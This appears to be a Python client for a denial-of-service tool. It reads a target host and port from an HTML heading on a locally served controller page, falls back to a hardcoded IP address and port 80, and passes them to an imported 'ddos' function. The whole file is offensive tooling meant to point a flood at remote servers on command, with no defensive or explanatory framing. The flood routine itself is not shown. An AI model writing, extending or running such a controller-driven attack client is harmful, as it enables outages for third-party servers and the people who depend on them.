from ddos import main as ddos

import sys, requests

from bs4 import BeautifulSoup

URL = 'http://localhost:3000'

def get_html():
  req = requests.get(URL)
  soup = BeautifulSoup(req.text)

  global parsed
  parsed = soup.body

def get_data():
  addr = {}
  # get html from website
  get_html()
  # get formatted data config
  data = parsed.h2.get_text().strip().split(':')

  try: addr["host"] = data[0]
  except: addr["host"] = '77.88.55.55'

  try: addr["port"] = int(data[1])
  except: addr["port"] = 80

  return addr

def main():
  data = get_data()
  ddos(_host=data["host"], _port=data["port"])

if __name__ == '__main__':
  main()